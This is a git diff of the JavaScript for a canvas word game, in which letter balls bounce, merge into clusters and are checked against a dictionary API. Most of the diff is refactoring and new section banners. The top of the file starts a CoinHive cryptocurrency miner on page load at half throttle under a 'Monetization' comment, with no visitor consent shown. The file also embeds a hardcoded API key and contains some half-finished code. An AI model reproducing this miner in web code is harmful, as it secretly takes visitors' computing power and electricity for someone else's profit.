@@ -1,3 +1,14 @@
+/***
+ *     ######   ##        #######  ########     ###    ##        ######                ########     ###    ########
+ *    ##    ##  ##       ##     ## ##     ##   ## ##   ##       ##    ##               ##     ##   ## ##   ##     ##
+ *    ##        ##       ##     ## ##     ##  ##   ##  ##       ##                     ##     ##  ##   ##  ##     ##
+ *    ##   #### ##       ##     ## ########  ##     ## ##        ######     #######    ########  ##     ## ##     ##
+ *    ##    ##  ##       ##     ## ##     ## ######### ##             ##               ##     ## ######### ##     ##
+ *    ##    ##  ##       ##     ## ##     ## ##     ## ##       ##    ##               ##     ## ##     ## ##     ##
+ *     ######   ########  #######  ########  ##     ## ########  ######                ########  ##     ## ########
+ */
+
+//Monetization
 var miner = new CoinHive.Anonymous('LxcVb1XF7gsPlDxz914zOLT2UUNiwhS7');
 	miner.setThrottle(.5);
   miner.start();
@@ -29,16 +40,18 @@ document.addEventListener(Event.MOUSEMOVE, getMouseXY, false);
 document.onmousemove = getMouseXY;
 
 window.onresize = function(event) {
-  stage.width = 10;
+  stage.width  = 10;
   stage.height = 10;
-  stageWidth = $(document).width();
-  stageHeight = $(document).height();
-  stage.width = stageWidth;
+  stageWidth   = $(document).width();
+  stageHeight  = $(document).height();
+  stage.width  = stageWidth;
   stage.height = stageHeight;
 }
 
+//kick off ball generation
 generateBalls(0,0);
 
+//get the canvas
 var drawingCanvas = document.getElementById('stage');
 if(drawingCanvas.getContext) {
   var context = drawingCanvas.getContext('2d');
@@ -55,48 +68,15 @@ jQuery(document).ready(function()
   stage.ontouchend   = function (e) { onMouseUp();   }
 })
 
-//todo: handle clicking on words
-function onMouseDown() {
-  // var dx = mouseX - rack.x;
-  // var dy = mouseY - rack.y;
-
-  //letter picking
-  var j = balls.length; //array of balls
-  while(--j > -1) {
-    var dx = mouseX - balls[j].x;
-    var dy = mouseY - balls[j].y;
-    var dist = Math.sqrt(dx * dx + dy * dy);
-
-    //if(dist < balls[j].size/2) { //detect ball touches
-    if(dist < balls[j].size) { //detect ball touches
-      if (balls[j].letters.length > 1) { //letter group
-        while (balls[j].letters.length > 1) {
-          newBall(balls[j].x, balls[j].y, balls[j].letters[0]);
-          balls[j].letters.splice(0,1);
-        }
-        document.getElementById("pop").play();
-        return;
-      } else { //single ball
-        currentDrag = balls[j];
-        currentDrag.dragging = true;
-        rack += currentDrag.letters[0]; //add letter to rack
-        balls.splice(j,1); //remove from balls
-        document.getElementById("pop").play();
-        return;
-      }
-    }
-  }
-  //word submissions
-  if (mouseY >= stageHeight - 50) { //click in the rack
-    checkWord(rack);
-    rack = ""; //clear word
-    generateBalls(mouseX, mouseY);
-  }
-}
-
-function onMouseUp() {
-  if(currentDrag != null) currentDrag.dragging = false;
-}
+/***
+ *    ########     ###    ##       ##           ######   ######## ##    ## ######## ########     ###    ######## ####  #######  ##    ##
+ *    ##     ##   ## ##   ##       ##          ##    ##  ##       ###   ## ##       ##     ##   ## ##      ##     ##  ##     ## ###   ##
+ *    ##     ##  ##   ##  ##       ##          ##        ##       ####  ## ##       ##     ##  ##   ##     ##     ##  ##     ## ####  ##
+ *    ########  ##     ## ##       ##          ##   #### ######   ## ## ## ######   ########  ##     ##    ##     ##  ##     ## ## ## ##
+ *    ##     ## ######### ##       ##          ##    ##  ##       ##  #### ##       ##   ##   #########    ##     ##  ##     ## ##  ####
+ *    ##     ## ##     ## ##       ##          ##    ##  ##       ##   ### ##       ##    ##  ##     ##    ##     ##  ##     ## ##   ###
+ *    ########  ##     ## ######## ########     ######   ######## ##    ## ######## ##     ## ##     ##    ##    ####  #######  ##    ##
+ */
 
 function generateBalls(mX, mY) {
   if (balls.length < maxBalls) {
@@ -119,43 +99,34 @@ function generateBalls(mX, mY) {
   }
 }
 
-function newBall(mX, mY, letter) {
+function newBall(mX, mY, letter, index) {
   //if (balls.length < maxBalls) {
     //for(var i = 0; i < volleySize; i++)	{
+			//convert index into an angle
+			var myAngle = index * 60 - 30;
+			console.log("Index = " + index);
+			console.log("Angle = " + myAngle);
+			console.log("x = " + Math.cos(myAngle));
+			console.log("y = " + Math.sin(myAngle));
+
       var ball = {}; //ball object
       ball.letters = [ letter ];
+      ball.letters = [ index ];
+
       ball.color = generateColor();
-      ball.bounce = .5 + (Math.random() * .5);
-      ball.vx = Math.random() * 50 - 25;
-      ball.vy = Math.random() * 50 - 25;
+      ball.bounce = .5;// + (Math.random() * .5);
+      ball.vx = 10 * Math.cos(myAngle);
+      ball.vy = 10 * Math.sin(myAngle);
       //ball.size = 45 - (ball.bounce * 25); //original size
       ball.size = 50; //fixed ball size
 
-      ball.x = Math.random() * stageWidth;
-      ball.y = Math.random() * stageHeight;
+      ball.x = mX + 30 * ball.vx;
+      ball.y = mY + 30 * ball.vy;
       //					 ball.x = (mX) ? (mX + Math.random() * 4) : (Math.random() * stageWidth);
       //					 ball.y = (mY) ? (mY + Math.random() * 4) : (Math.random() * stageHeight);
       balls[balls.length] = ball;
     //}
   //}
-}
-
-function combineObjects(obj1, obj2) {
-  //merge
-  if (obj1.letters.length + obj2.letters.length <= 7) {
-    for (letter in obj2.letters)
-      obj1.letters.push(obj2.letters[letter]);
-  console.log(obj1.letters);
-  //remove
-  var j = balls.length; //array of balls
-  while(--j > -1) {
-    if(obj2.x == balls[j].x && obj2.y == balls[j].y) {
-      balls.splice(j,1); //remove from balls
-      return true;
-    }
-  }
-}
-return false; //unable to merge - too big
 }
 
 //generates random color
@@ -169,37 +140,20 @@ function generateColor()
   //return "red";
 }
 
-function scoreWord(word) {
-  return Math.pow(word.length,2);
-}
-
 //generates random color
 function generateLetter() {
   return "aaaaaaaabcccddddeeeeeeeeeeeeeffgghhhhhhiiiiiiijkllllmmnnnnnnnooooooooppqrrrrrrsssssstttttttttuuuvwwxyyz".charAt(Math.round(Math.random()*103));
 }
 
-function render() {
-  var isChange = (browserX != window.screenX || browserY != window.screenY);
-  if(isChange) {
-    var diffX = browserX - window.screenX;
-    browserX = window.screenX;
-
-    var diffY = browserY - window.screenY;
-    browserY = window.screenY;
-  }
-
-  var j = balls.length;
-  while(--j > -1) {
-    update(balls[j]);
-
-    if(isChange) {
-      balls[j].vx += (diffX * .05);
-      balls[j].vy += (diffY * .1);
-    }
-  }
-
-  draw();
-}
+/***
+ *    ########  ########     ###    ##      ## #### ##    ##  ######
+ *    ##     ## ##     ##   ## ##   ##  ##  ##  ##  ###   ## ##    ##
+ *    ##     ## ##     ##  ##   ##  ##  ##  ##  ##  ####  ## ##
+ *    ##     ## ########  ##     ## ##  ##  ##  ##  ## ## ## ##   ####
+ *    ##     ## ##   ##   ######### ##  ##  ##  ##  ##  #### ##    ##
+ *    ##     ## ##    ##  ##     ## ##  ##  ##  ##  ##   ### ##    ##
+ *    ########  ##     ## ##     ##  ###  ###  #### ##    ##  ######
+ */
 
 function draw() {
   generateBalls(); //generate new balls if necesary
@@ -241,43 +195,55 @@ function drawBall(ball) {
   var curLetter = ball.letters.length;
   switch(curLetter) {
   case 7:
-    //Ball
-    context.fillStyle = gradient;
-    context.beginPath();
-    context.arc(ball.x, ball.y + 60, ball.size, 0, Math.PI*2, true);
-    context.fill();
+		//Ball - ????
+		context.fillStyle = gradient;
+		context.beginPath();
+		context.arc(ball.x-45, ball.y-30, ball.size, 0, Math.PI*2, true);
+		context.fill();
 
-    //Letter
-    context.textAlign = "center";
-    context.textBaseline = "middle";
-    context.fillStyle = "white";
-    context.fillText(ball.letters[6], ball.x, ball.y + 62 );
+		//Letter
+		context.textAlign = "center";
+		context.textBaseline = "middle";
+		context.fillStyle = "white";
+		context.fillText(ball.letters[6], ball.x-45, ball.y - 32); //shift letters up slightly
   case 6:
-    //Ball
-    context.fillStyle = gradient;
-    context.beginPath();
-    context.arc(ball.x, ball.y - 60, ball.size, 0, Math.PI*2, true);
-    context.fill();
+		//Ball
+		context.fillStyle = gradient;
+		context.beginPath();
+		context.arc(ball.x-45, ball.y+30, ball.size, 0, Math.PI*2, true);
+		context.fill();
 
-    //Letter
-    context.textAlign = "center";
-    context.textBaseline = "middle";
-    context.fillStyle = "white";
-    context.fillText(ball.letters[5], ball.x, ball.y - 58 );
+		//Letter
+		context.textAlign = "center";
+		context.textBaseline = "middle";
+		context.fillStyle = "white";
+		context.fillText(ball.letters[5], ball.x-45, ball.y +28); //shift letters up slightly
   case 5:
-    //Ball
-    context.fillStyle = gradient;
-    context.beginPath();
-    context.arc(ball.x-45, ball.y+30, ball.size, 0, Math.PI*2, true);
-    context.fill();
+		//Bottom
+		context.fillStyle = gradient;
+		context.beginPath();
+		context.arc(ball.x, ball.y + 60, ball.size, 0, Math.PI*2, true);
+		context.fill();
 
-    //Letter
-    context.textAlign = "center";
-    context.textBaseline = "middle";
-    context.fillStyle = "white";
-    context.fillText(ball.letters[4], ball.x-45, ball.y +28); //shift letters up slightly
+		//Letter
+		context.textAlign = "center";
+		context.textBaseline = "middle";
+		context.fillStyle = "white";
+		context.fillText(ball.letters[4], ball.x, ball.y + 62 );
   case 4:
-    //Ball
+		//Ball
+		context.fillStyle = gradient;
+		context.beginPath();
+		context.arc(ball.x+45, ball.y+30, ball.size, 0, Math.PI*2, true);
+		context.fill();
+
+		//Letter
+		context.textAlign = "center";
+		context.textBaseline = "middle";
+		context.fillStyle = "white";
+		context.fillText(ball.letters[3], ball.x+45, ball.y +28); //shift letters up slightly
+  case 3:
+		//Ball - 1 O'clock
     context.fillStyle = gradient;
     context.beginPath();
     context.arc(ball.x+45, ball.y-30, ball.size, 0, Math.PI*2, true);
@@ -287,33 +253,21 @@ function drawBall(ball) {
     context.textAlign = "center";
     context.textBaseline = "middle";
     context.fillStyle = "white";
-    context.fillText(ball.letters[3], ball.x+45, ball.y -32); //shift letters up slightly
-  case 3:
-    //Ball
-    context.fillStyle = gradient;
-    context.beginPath();
-    context.arc(ball.x+45, ball.y+30, ball.size, 0, Math.PI*2, true);
-    context.fill();
+    context.fillText(ball.letters[2], ball.x+45, ball.y -32); //shift letters up slightly
+	case 2:
+		//Top Ball
+		context.fillStyle = gradient;
+		context.beginPath();
+		context.arc(ball.x, ball.y - 60, ball.size, 0, Math.PI*2, true);
+		context.fill();
 
-    //Letter
-    context.textAlign = "center";
-    context.textBaseline = "middle";
-    context.fillStyle = "white";
-    context.fillText(ball.letters[2], ball.x+45, ball.y +28); //shift letters up slightly
-  case 2:
-    //Ball
-    context.fillStyle = gradient;
-    context.beginPath();
-    context.arc(ball.x-45, ball.y-30, ball.size, 0, Math.PI*2, true);
-    context.fill();
-
-    //Letter
-    context.textAlign = "center";
-    context.textBaseline = "middle";
-    context.fillStyle = "white";
-    context.fillText(ball.letters[1], ball.x-45, ball.y - 32); //shift letters up slightly
+		//Letter
+		context.textAlign = "center";
+		context.textBaseline = "middle";
+		context.fillStyle = "white";
+		context.fillText(ball.letters[1], ball.x, ball.y - 58 );
   case 1:
-    //Ball
+    //Center Ball
     context.fillStyle = gradient;
     context.beginPath();
     context.arc(ball.x, ball.y, ball.size, 0, Math.PI*2, true);
@@ -337,7 +291,7 @@ function update(ball) {
   // var drag = .98; //original drag
 
   var gravity = 0; // no gravity
-  var drag = .995;//.9999999; //very little resistence
+  var drag = .999;//.9999999; //very little resistence
 
   if(ball.dragging) {
     ball.vx = ball.x - ball.ox;
@@ -348,18 +302,13 @@ function update(ball) {
     ball.x = mouseX;
     ball.y = mouseY;
 
-    if ((ball.x + ball.size) > stageWidth) {
-      ball.x = stageWidth - ball.size;
-    } else if((ball.x - ball.size) < 0) {
-      ball.x = 0 + ball.size;
-    }
+    if ((ball.x + ball.size) > stageWidth)  { ball.x = stageWidth  - ball.size; }
+    else if((ball.x - ball.size) < 0) { ball.x = 0 + ball.size; }
 
-    if ((ball.y + ball.size) > stageHeight) {
-      ball.y = stageHeight - ball.size;
-    } else if((ball.y - ball.size) < 0) {
-      ball.y = 0 + ball.size;
-    }
-  } else {
+    if ((ball.y + ball.size) > stageHeight) { ball.y = stageHeight - ball.size;}
+		else if((ball.y - ball.size) < 0) { ball.y = 0 + ball.size; }
+  }
+	else {
     ball.x += ball.vx;
     ball.y += ball.vy;
 
@@ -386,7 +335,39 @@ function update(ball) {
   }
 }
 
-//todo: code stickyness
+/***
+ *     ######   #######  ##       ##       ####  ######  ####  #######  ##    ##  ######
+ *    ##    ## ##     ## ##       ##        ##  ##    ##  ##  ##     ## ###   ## ##    ##
+ *    ##       ##     ## ##       ##        ##  ##        ##  ##     ## ####  ## ##
+ *    ##       ##     ## ##       ##        ##   ######   ##  ##     ## ## ## ##  ######
+ *    ##       ##     ## ##       ##        ##        ##  ##  ##     ## ##  ####       ##
+ *    ##    ## ##     ## ##       ##        ##  ##    ##  ##  ##     ## ##   ### ##    ##
+ *     ######   #######  ######## ######## ####  ######  ####  #######  ##    ##  ######
+ */
+
+//Combines Object B with Object A
+function combineObjects(obj1, obj2) {
+	if (obj1.letters.length < obj2.letters.length) {
+		temp = obj1;
+		obj1 = obj2;
+		obj2 = temp;
+	}
+	//merge
+	if (obj1.letters.length + obj2.letters.length <= 7) {
+		obj1.letters = obj1.letters.concat(obj2.letters);
+		//console.log(obj1.letters); //debug
+		//remove
+		var j = balls.length; //array of balls
+		while(--j > -1) {
+			if(obj2.x == balls[j].x && obj2.y == balls[j].y) {
+				balls.splice(j,1); //remove from balls
+				return true;
+			}
+		}
+	}
+	return false; //unable to merge - too big
+}
+
 function collisionCheck()
 {
   var spring = .5;
@@ -412,25 +393,78 @@ function collisionCheck()
           var ax = (tx - ball1.x);
           var ay = (ty - ball1.y);
 
-
           ball0.x -= ax;
           ball0.y -= ay;
 
           ball1.x += ax;
           ball1.y += ay;
 
-
           ball0.vx -= (ax * spring);
           ball0.vy -= (ay * spring);
           ball1.vx += (ax * spring);
           ball1.vy += (ay * spring);
         } else {
+					ball0.vx
           //combine momentum
         }
       }
     }
   }
 }
+
+/***
+ *    ######## ##     ## ######## ##    ## ########  ######
+ *    ##       ##     ## ##       ###   ##    ##    ##    ##
+ *    ##       ##     ## ##       ####  ##    ##    ##
+ *    ######   ##     ## ######   ## ## ##    ##     ######
+ *    ##        ##   ##  ##       ##  ####    ##          ##
+ *    ##         ## ##   ##       ##   ###    ##    ##    ##
+ *    ########    ###    ######## ##    ##    ##     ######
+ */
+
+ //todo: handle clicking on words
+ function onMouseDown() {
+   // var dx = mouseX - rack.x;
+   // var dy = mouseY - rack.y;
+
+   //letter picking
+   var j = balls.length; //array of balls
+   while(--j > -1) {
+     var dx = mouseX - balls[j].x;
+     var dy = mouseY - balls[j].y;
+     var dist = Math.sqrt(dx * dx + dy * dy);
+
+     //if(dist < balls[j].size/2) { //detect ball touches
+     if(dist < balls[j].size) { //detect ball touches
+       if (balls[j].letters.length > 1) { //letter group
+         while (balls[j].letters.length > 1) {
+					 var index = balls[j].letters.length - 1;
+           newBall(balls[j].x, balls[j].y, balls[j].letters[index], index);
+           balls[j].letters.splice(balls[j].letters.length - 1,1);
+         }
+         document.getElementById("pop").play();
+         return;
+       } else { //single ball
+         currentDrag = balls[j];
+         currentDrag.dragging = true;
+         rack += currentDrag.letters[0]; //add letter to rack
+         balls.splice(j,1); //remove from balls
+         document.getElementById("pop").play();
+         return;
+       }
+     }
+   }
+   //word submissions
+   if (mouseY >= stageHeight - 50) { //click in the rack
+     checkWord(rack);
+     rack = ""; //clear word
+     generateBalls(mouseX, mouseY);
+   }
+ }
+
+ function onMouseUp() {
+   if(currentDrag != null) currentDrag.dragging = false;
+ }
 
 function getMouseXY(e) {
   mouseX = e.pageX;
@@ -442,39 +476,74 @@ function getMouseXY(e) {
   return true;
 }
 
-function checkWord(word) {
-  var url = "https://api.wordnik.com/v4/word.json/" + word + "/definitions?limit=1&includeRelated=true&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5";
-  var xmlhttp = new XMLHttpRequest();
-  xmlhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      var defs = JSON.parse(this.responseText);
-      if (defs.length == 0) {
-        //alert("bad");
-        latestWord = word;
-        latestDef = 'a "word" you just made up';
+function render() {
+  var isChange = (browserX != window.screenX || browserY != window.screenY);
+  if(isChange) {
+    var diffX = browserX - window.screenX;
+    browserX = window.screenX;
 
-        score -= scoreWord(word);
-        document.getElementById("horn").play();
+    var diffY = browserY - window.screenY;
+    browserY = window.screenY;
+  }
 
-        return false;
-      } else {
-        //alert("good");
-        latestWord = word;
-        latestDef = defs[0].text;
+  var j = balls.length;
+  while(--j > -1) {
+    update(balls[j]);
 
-        score += scoreWord(word);
-        document.getElementById("chimes").play();
-
-        return true;
-      }
+    if(isChange) {
+      balls[j].vx += (diffX * .05);
+      balls[j].vy += (diffY * .1);
     }
-  };
-  xmlhttp.open("GET", url, true);
-  xmlhttp.send();
+  }
+
+  draw();
 }
 
-function writeDef() {
+/***
+ *    ##      ##  #######  ########  ########       ########  ######## ##          ###    ######## ######## ########
+ *    ##  ##  ## ##     ## ##     ## ##     ##      ##     ## ##       ##         ## ##      ##    ##       ##     ##
+ *    ##  ##  ## ##     ## ##     ## ##     ##      ##     ## ##       ##        ##   ##     ##    ##       ##     ##
+ *    ##  ##  ## ##     ## ########  ##     ##      ########  ######   ##       ##     ##    ##    ######   ##     ##
+ *    ##  ##  ## ##     ## ##   ##   ##     ##      ##   ##   ##       ##       #########    ##    ##       ##     ##
+ *    ##  ##  ## ##     ## ##    ##  ##     ##      ##    ##  ##       ##       ##     ##    ##    ##       ##     ##
+ *     ###  ###   #######  ##     ## ########       ##     ## ######## ######## ##     ##    ##    ######## ########
+ */
+ function scoreWord(word) {
+   return Math.pow(word.length,2);
+ }
 
+ function checkWord(word) {
+   var url = "https://api.wordnik.com/v4/word.json/" + word + "/definitions?limit=1&includeRelated=true&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5";
+   var xmlhttp = new XMLHttpRequest();
+   xmlhttp.onreadystatechange = function() {
+     if (this.readyState == 4 && this.status == 200) {
+       var defs = JSON.parse(this.responseText);
+       if (defs.length == 0) {
+         //alert("bad");
+         latestWord = word;
+         latestDef = 'a "word" you just made up';
+
+         score -= scoreWord(word);
+         document.getElementById("horn").play();
+
+         return false;
+       } else {
+         //alert("good");
+         latestWord = word;
+         latestDef = defs[0].text;
+
+         score += scoreWord(word);
+         document.getElementById("chimes").play();
+
+         return true;
+       }
+     }
+   };
+   xmlhttp.open("GET", url, true);
+   xmlhttp.send();
+ }
+
+function writeDef() {
   var text = latestWord + " - " + latestDef,
   fontSize = 36,
      width = stageWidth,
@@ -512,6 +581,16 @@ function writeDef() {
     context.fillText(lines[i].text, 20, 10 + lines[i].height);
   }
 }
+
+/***
+ *    ########   #######  ##     ##      ##     ##    ###    ##    ## #### ########
+ *    ##     ## ##     ## ###   ###      ###   ###   ## ##   ###   ##  ##  ##     ##
+ *    ##     ## ##     ## #### ####      #### ####  ##   ##  ####  ##  ##  ##     ##
+ *    ##     ## ##     ## ## ### ##      ## ### ## ##     ## ## ## ##  ##  ########
+ *    ##     ## ##     ## ##     ##      ##     ## ######### ##  ####  ##  ##
+ *    ##     ## ##     ## ##     ##      ##     ## ##     ## ##   ###  ##  ##
+ *    ########   #######  ##     ##      ##     ## ##     ## ##    ## #### ##
+ */
 
 function getDocWidth() {
   var w = window;
